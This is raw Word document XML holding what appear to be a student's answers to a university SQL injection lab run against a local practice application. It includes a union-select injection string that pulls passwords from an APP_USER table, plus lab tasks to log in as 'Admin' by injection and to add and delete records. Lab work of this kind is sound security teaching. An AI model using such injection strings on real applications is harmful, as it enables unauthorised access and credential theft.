          <w:color w:val="FFFFFF" w:themeColor="background1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00C032CB" w:rsidRPr="000A254F">
        <w:rPr>
          <w:rFonts w:cs="Helvetica"/>
          <w:color w:val="353535"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">2) </w:t>
      </w:r>
      <w:r w:rsidR="000A254F" w:rsidRPr="000A254F">
        <w:rPr>
          <w:rFonts w:cs="Helvetica"/>
          <w:color w:val="353535"/>
        </w:rPr>
        <w:t>Find password by username</w:t>
      </w:r>
      <w:r w:rsidR="000A254F" w:rsidRPr="000A254F">
        <w:rPr>
          <w:rFonts w:cs="Helvetica"/>
          <w:color w:val="353535"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r w:rsidR="000A254F" w:rsidRPr="000A254F">
        <w:rPr>
          <w:rFonts w:cs="Helvetica"/>
          <w:color w:val="353535"/>
        </w:rPr>
        <w:t>anything' union select</w:t>
      </w:r>
      <w:r w:rsidR="000A254F" w:rsidRPr="000A254F">
        <w:rPr>
          <w:rFonts w:cs="Helvetica"/>
          <w:color w:val="353535"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="000A254F" w:rsidRPr="000A254F">
        <w:rPr>
          <w:rFonts w:cs="Helvetica"/>
          <w:b/>
          <w:color w:val="353535"/>
        </w:rPr>
        <w:t>{1)’s result}</w:t>
      </w:r>
      <w:r w:rsidR="000A254F" w:rsidRPr="000A254F">
        <w:rPr>
          <w:rFonts w:cs="Helvetica"/>
          <w:color w:val="353535"/>
        </w:rPr>
        <w:t xml:space="preserve">, 'string' from APP_USER where </w:t>
      </w:r>
      <w:r w:rsidR="000A254F" w:rsidRPr="000A254F">
        <w:rPr>
          <w:rFonts w:cs="Helvetica"/>
          <w:b/>
          <w:color w:val="353535"/>
        </w:rPr>
        <w:t>{1)’s result}</w:t>
      </w:r>
      <w:r w:rsidR="000A254F" w:rsidRPr="000A254F">
        <w:rPr>
          <w:rFonts w:cs="Helvetica"/>
          <w:color w:val="353535"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="000A254F" w:rsidRPr="000A254F">
        <w:rPr>
          <w:rFonts w:cs="Helvetica"/>
          <w:color w:val="353535"/>
        </w:rPr>
        <w:t>like '%dmi%</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4CCCB816" w14:textId="77777777" w:rsidR="00D15FD2" w:rsidRPr="000A254F" w:rsidRDefault="00D15FD2" w:rsidP="00D15FD2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color w:val="auto"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="000A254F">
        <w:rPr>
          <w:rFonts w:cs="Beirut"/>
          <w:color w:val="auto"/>
        </w:rPr>
        <w:t xml:space="preserve">Login as the </w:t>
      </w:r>
      <w:r w:rsidRPr="000A254F">
        <w:rPr>
          <w:rFonts w:eastAsia="Calibri" w:cs="Calibri"/>
          <w:color w:val="auto"/>
        </w:rPr>
        <w:t>“Admin”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through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application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and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add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a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 xml:space="preserve">. </w:t>
      </w:r>
      <w:r w:rsidRPr="000A254F">
        <w:rPr>
          <w:rFonts w:eastAsia="Calibri" w:cs="Calibri"/>
          <w:color w:val="auto"/>
        </w:rPr>
        <w:t>Verify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new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by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querying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app</w:t>
      </w:r>
      <w:r w:rsidRPr="000A254F">
        <w:rPr>
          <w:rFonts w:cs="Beirut"/>
          <w:color w:val="auto"/>
        </w:rPr>
        <w:t>_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table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in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SQL</w:t>
      </w:r>
      <w:r w:rsidRPr="000A254F">
        <w:rPr>
          <w:rFonts w:cs="Beirut"/>
          <w:color w:val="auto"/>
        </w:rPr>
        <w:t>*</w:t>
      </w:r>
      <w:r w:rsidRPr="000A254F">
        <w:rPr>
          <w:rFonts w:eastAsia="Calibri" w:cs="Calibri"/>
          <w:color w:val="auto"/>
        </w:rPr>
        <w:t>Plus</w:t>
      </w:r>
      <w:r w:rsidRPr="000A254F">
        <w:rPr>
          <w:rFonts w:cs="Beirut"/>
          <w:color w:val="auto"/>
        </w:rPr>
        <w:t xml:space="preserve">. </w:t>
      </w:r>
      <w:r w:rsidRPr="000A254F">
        <w:rPr>
          <w:rFonts w:ascii="MS Mincho" w:eastAsia="MS Mincho" w:hAnsi="MS Mincho" w:cs="MS Mincho"/>
          <w:color w:val="auto"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r w:rsidR="000A254F" w:rsidRPr="000A254F">
        <w:rPr>
          <w:rFonts w:eastAsia="MS Mincho" w:cs="MS Mincho"/>
          <w:color w:val="auto"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r w:rsidR="000A254F" w:rsidRPr="000A254F">
        <w:rPr>
          <w:rFonts w:eastAsia="MS Mincho" w:cs="MS Mincho"/>
          <w:color w:val="auto"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r w:rsidR="000A254F" w:rsidRPr="000A254F">
        <w:rPr>
          <w:rFonts w:eastAsia="MS Mincho" w:cs="MS Mincho"/>
          <w:b/>
          <w:color w:val="auto"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>Easily</w:t>
      </w:r>
      <w:r w:rsidR="000A254F">
        <w:rPr>
          <w:rFonts w:eastAsia="MS Mincho" w:cs="MS Mincho"/>
          <w:b/>
          <w:color w:val="auto"/>
        </w:rPr>
        <w:t xml:space="preserve"> to</w:t>
      </w:r>
      <w:r w:rsidR="000A254F" w:rsidRPr="000A254F">
        <w:rPr>
          <w:rFonts w:eastAsia="MS Mincho" w:cs="MS Mincho"/>
          <w:b/>
          <w:color w:val="auto"/>
        </w:rPr>
        <w:t xml:space="preserve"> do by yourself</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="64BEF0F1" w14:textId="77777777" w:rsidR="00D15FD2" w:rsidRPr="000A254F" w:rsidRDefault="00D15FD2" w:rsidP="00D15FD2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color w:val="auto"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="000A254F">
        <w:rPr>
          <w:rFonts w:cs="Beirut"/>
          <w:color w:val="auto"/>
        </w:rPr>
        <w:t xml:space="preserve">Login as the </w:t>
      </w:r>
      <w:r w:rsidRPr="000A254F">
        <w:rPr>
          <w:rFonts w:eastAsia="Calibri" w:cs="Calibri"/>
          <w:color w:val="auto"/>
        </w:rPr>
        <w:t>“Admin”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through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application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and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delete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added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in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question</w:t>
      </w:r>
      <w:r w:rsidRPr="000A254F">
        <w:rPr>
          <w:rFonts w:cs="Beirut"/>
          <w:color w:val="auto"/>
        </w:rPr>
        <w:t xml:space="preserve"> 2. </w:t>
      </w:r>
      <w:r w:rsidRPr="000A254F">
        <w:rPr>
          <w:rFonts w:eastAsia="Calibri" w:cs="Calibri"/>
          <w:color w:val="auto"/>
        </w:rPr>
        <w:t>Verify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was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deleted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by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querying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the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app</w:t>
      </w:r>
      <w:r w:rsidRPr="000A254F">
        <w:rPr>
          <w:rFonts w:cs="Beirut"/>
          <w:color w:val="auto"/>
        </w:rPr>
        <w:t>_</w:t>
      </w:r>
      <w:r w:rsidRPr="000A254F">
        <w:rPr>
          <w:rFonts w:eastAsia="Calibri" w:cs="Calibri"/>
          <w:color w:val="auto"/>
        </w:rPr>
        <w:t>user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table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in</w:t>
      </w:r>
      <w:r w:rsidRPr="000A254F">
        <w:rPr>
          <w:rFonts w:cs="Beirut"/>
          <w:color w:val="auto"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="000A254F">
        <w:rPr>
          <w:rFonts w:eastAsia="Calibri" w:cs="Calibri"/>
          <w:color w:val="auto"/>
        </w:rPr>
        <w:t>SQL</w:t>
      </w:r>
      <w:r w:rsidRPr="000A254F">
        <w:rPr>
          <w:rFonts w:cs="Beirut"/>
          <w:color w:val="auto"/>
        </w:rPr>
        <w:t>*</w:t>
      </w:r>
      <w:r w:rsidRPr="000A254F">
        <w:rPr>
          <w:rFonts w:eastAsia="Calibri" w:cs="Calibri"/>
          <w:color w:val="auto"/>
        </w:rPr>
        <w:t>Plus</w:t>
      </w:r>
      <w:r w:rsidRPr="000A254F">
        <w:rPr>
          <w:rFonts w:cs="Beirut"/>
          <w:color w:val="auto"/>
        </w:rPr>
        <w:t xml:space="preserve">. </w:t>
      </w:r>
      <w:r w:rsidRPr="000A254F">
        <w:rPr>
          <w:rFonts w:ascii="MS Mincho" w:eastAsia="MS Mincho" w:hAnsi="MS Mincho" w:cs="MS Mincho"/>
          <w:color w:val="auto"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r w:rsidR="000A254F" w:rsidRPr="000A254F">
        <w:rPr>
          <w:rFonts w:eastAsia="MS Mincho" w:cs="MS Mincho"/>
          <w:color w:val="auto"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r w:rsidR="000A254F" w:rsidRPr="000A254F">
        <w:rPr>
          <w:rFonts w:eastAsia="MS Mincho" w:cs="MS Mincho"/>
          <w:color w:val="auto"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r w:rsidR="000A254F" w:rsidRPr="000A254F">
        <w:rPr>
          <w:rFonts w:eastAsia="MS Mincho" w:cs="MS Mincho"/>
          <w:b/>
          <w:color w:val="auto"/>
        </w:rPr>
        <w:t>Easily</w:t>
      </w:r>
      <w:r w:rsidR="000A254F">
        <w:rPr>
          <w:rFonts w:eastAsia="MS Mincho" w:cs="MS Mincho"/>
          <w:b/>
          <w:color w:val="auto"/>
        </w:rPr>
        <w:t xml:space="preserve"> to</w:t>
      </w:r>
      <w:r w:rsidR="000A254F" w:rsidRPr="000A254F">
        <w:rPr>
          <w:rFonts w:eastAsia="MS Mincho" w:cs="MS Mincho"/>
          <w:b/>
          <w:color w:val="auto"/>
        </w:rPr>
        <w:t xml:space="preserve"> do by yourself</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C2E3C4C" w14:textId="77777777" w:rsidR="00D15FD2" w:rsidRPr="000A254F" w:rsidRDefault="00D15FD2" w:rsidP="00D15FD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Beirut"/>
          <w:b/>
          <w:color w:val="auto"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="000A254F">
        <w:rPr>
          <w:rFonts w:cs="Beirut"/>
          <w:b/>
          <w:color w:val="auto"/>
        </w:rPr>
        <w:t xml:space="preserve">Part 1 </w:t>
      </w:r>
      <w:r w:rsidRPr="000A254F">
        <w:rPr>
          <w:rFonts w:eastAsia="Calibri" w:cs="Calibri"/>
          <w:b/>
          <w:color w:val="auto"/>
        </w:rPr>
        <w:t>–</w:t>
      </w:r>
      <w:r w:rsidRPr="000A254F">
        <w:rPr>
          <w:rFonts w:cs="Beirut"/>
          <w:b/>
          <w:color w:val="auto"/>
        </w:rPr>
        <w:t xml:space="preserve"> 4</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="64CBF4EB" w14:textId="77777777" w:rsidR="00D15FD2" w:rsidRPr="000A254F" w:rsidRDefault="00D15FD2" w:rsidP="00D15FD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 w:line="360" w:lineRule="atLeast"/>
        <w:rPr>
          <w:rFonts w:cs="Beirut"/>
          <w:color w:val="auto"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D15FD2">
        <w:rPr>
          <w:rFonts w:cs="Beirut"/>
          <w:color w:val="auto"/>
        </w:rPr>
        <w:t xml:space="preserve">Use a SQL Injection string in any of the applications used in this lab to extract a unique piece of information from the database that was not already covered in this lab. </w:t>
      </w:r>
      <w:r w:rsidR="000A254F">
        <w:rPr>
          <w:rFonts w:cs="Beirut"/>
          <w:color w:val="auto"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r w:rsidR="000A254F">
        <w:rPr>
          <w:rFonts w:cs="Beirut"/>
          <w:color w:val="auto"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r w:rsidR="000A254F" w:rsidRPr="000A254F">
        <w:rPr>
          <w:rFonts w:cs="Beirut"/>
          <w:b/>
          <w:color w:val="auto"/>
        </w:rPr>
        <w:t>I got my one, do by yourself one</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7F7FB5E2" w14:textId="77777777" w:rsidR="000A254F" w:rsidRDefault="000A254F" w:rsidP="000A254F">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>Part 2</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">. </w:t>
      </w:r>
      <w:r>
        <w:t>Encryption Lab</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="61718920" w14:textId="77777777" w:rsidR="000A254F" w:rsidRPr="000A254F" w:rsidRDefault="000A254F" w:rsidP="000A254F">
      <w:r>
        <w:t>Do it later, maybe!</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5BA66B5D" w14:textId="77777777" w:rsidR="000A254F" w:rsidRPr="000A254F" w:rsidRDefault="000A254F" w:rsidP="000A254F">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:after="240" w:line="360" w:lineRule="atLeast"/>
        <w:rPr>
          <w:rFonts w:cs="Beirut"/>
          <w:color w:val="auto"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1A71A75A" w14:textId="77777777" w:rsidR="00D15FD2" w:rsidRPr="00D15FD2" w:rsidRDefault="00D15FD2" w:rsidP="00D15FD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Times" w:hAnsi="Times" w:cs="Times"/>
          <w:color w:val="auto"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="152DF600" w14:textId="77777777" w:rsidR="00D15FD2" w:rsidRPr="00D15FD2" w:rsidRDefault="00D15FD2" w:rsidP="00D15FD2"/>
    <w:p w14:paraId="1F430A5C" w14:textId="77777777" w:rsidR="00D15FD2" w:rsidRDefault="00D15FD2" w:rsidP="00D15FD2">
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="432" w:hanging="432"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="69F13347" w14:textId="77777777" w:rsidR="00A6622D" w:rsidRDefault="00094D5C">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>T</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">o learn more and get OneNote, visit </w:t>
      </w:r>
      <w:hyperlink r:id="rId10" w:history="1">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>www.</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>o</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>nenote.com</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:sectPr w:rsidR="00A662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433C8" w14:textId="77777777" w:rsidR="00094D5C" w:rsidRDefault="00094D5C">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:separator/>
      </w:r>
    </w:p>
    <w:p w14:paraId="5C0332FB" w14:textId="77777777" w:rsidR="00094D5C" w:rsidRDefault="00094D5C"/>
    <w:p w14:paraId="01C7B149" w14:textId="77777777" w:rsidR="00094D5C" w:rsidRDefault="00094D5C"/>
  </w:endnote>
  <w:endnote w:type="continuationSeparator" w:id="0">
    <w:p w14:paraId="589D2ADC" w14:textId="77777777" w:rsidR="00094D5C" w:rsidRDefault="00094D5C">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:continuationSeparator/>
      </w:r>
    </w:p>
    <w:p w14:paraId="208223B9" w14:textId="77777777" w:rsidR="00094D5C" w:rsidRDefault="00094D5C"/>
    <w:p w14:paraId="3BA135F7" w14:textId="77777777" w:rsidR="00094D5C" w:rsidRDefault="00094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56F06" w14:textId="77777777" w:rsidR="00A6622D" w:rsidRDefault="00A6622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8FC2A" w14:textId="77777777" w:rsidR="00A6622D" w:rsidRDefault="00094D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8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65904" w14:textId="77777777" w:rsidR="00A6622D" w:rsidRDefault="00A6622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82A5C" w14:textId="77777777" w:rsidR="00094D5C" w:rsidRDefault="00094D5C">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:separator/>
      </w:r>
    </w:p>
    <w:p w14:paraId="14AE190A" w14:textId="77777777" w:rsidR="00094D5C" w:rsidRDefault="00094D5C"/>
    <w:p w14:paraId="760353CB" w14:textId="77777777" w:rsidR="00094D5C" w:rsidRDefault="00094D5C"/>
  </w:footnote>
  <w:footnote w:type="continuationSeparator" w:id="0">
    <w:p w14:paraId="76715DF3" w14:textId="77777777" w:rsidR="00094D5C" w:rsidRDefault="00094D5C">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:continuationSeparator/>
      </w:r>
    </w:p>
    <w:p w14:paraId="762E2398" w14:textId="77777777" w:rsidR="00094D5C" w:rsidRDefault="00094D5C"/>
    <w:p w14:paraId="631862D8" w14:textId="77777777" w:rsidR="00094D5C" w:rsidRDefault="00094D5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5710F4" w14:textId="77777777" w:rsidR="00A6622D" w:rsidRDefault="00A6622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296B3" w14:textId="77777777" w:rsidR="00A6622D" w:rsidRDefault="00A6622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61F1B" w14:textId="77777777" w:rsidR="00A6622D" w:rsidRDefault="00A662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C98568D"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="81FE7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852965"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="68F2A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DE0F97"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="53B00312"/>
    <w:lvl w:ilvl="0" w:tplc="53A68A6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17BBD"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="DD6E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FF401A"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="1BD2B970"/>
    <w:lvl w:ilvl="0" w:tplc="15FCAEA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9"/>
    <w:lvlOverride w:ilvl="0">
      <w:startOverride w:val="1"/>
    </w:lvlOverride>
  </w:num>
  <w:num w:numId="13">
    <w:abstractNumId w:val="14"/>
  </w:num>
  <w:num w:numId="14">
    <w:abstractNumId w:val="16"/>
  </w:num>
  <w:num w:numId="15">
    <w:abstractNumId w:val="15"/>
  </w:num>
  <w:num w:numId="16">
    <w:abstractNumId w:val="13"/>
  </w:num>
  <w:num w:numId="17">
    <w:abstractNumId w:val="10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D2"/>
    <w:rsid w:val="00094D5C"/>
    <w:rsid w:val="000A254F"/>
    <w:rsid w:val="00150299"/>
    <w:rsid w:val="00796829"/>
    <w:rsid w:val="00A538EB"/>
    <w:rsid w:val="00A6622D"/>
    <w:rsid w:val="00C032CB"/>
    <w:rsid w:val="00D1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4C5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FD2"/>
    <w:rPr>
      <w:color w:val="8956A5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1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3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share.vn/file/UDZO344UPQ8O" TargetMode="External"/><Relationship Id="rId8" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://www.virtualbox.org/wiki/Downloads" TargetMode="External"/><Relationship Id="rId9" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://localhost:8888/sql_injection" TargetMode="External"/><Relationship Id="rId10" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://go.microsoft.com/fwlink/?LinkID=5238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ung1991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0F"/>
    <w:rsid w:val="000B270F"/>
    <w:rsid w:val="009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6388506B23CF47995C10DF5BB6A669">
    <w:name w:val="CD6388506B23CF47995C10DF5BB6A669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865E47F4D1F08B47B08DF05A6AFBE53E">
    <w:name w:val="865E47F4D1F08B47B08DF05A6AFBE53E"/>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="71D79146B894E04784E023E446772831">
    <w:name w:val="71D79146B894E04784E023E446772831"/>
    <w:rsid w:val="000B270F"/>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="6B1D1BE24826D849953E1B1253F33F19">
    <w:name w:val="6B1D1BE24826D849953E1B1253F33F19"/>
    <w:rsid w:val="000B2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41</TotalTime>
  <Pages>4</Pages>
  <Words>621</Words>
  <Characters>3544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2016-03-13T09:32:00Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2016-03-13T11:47:00Z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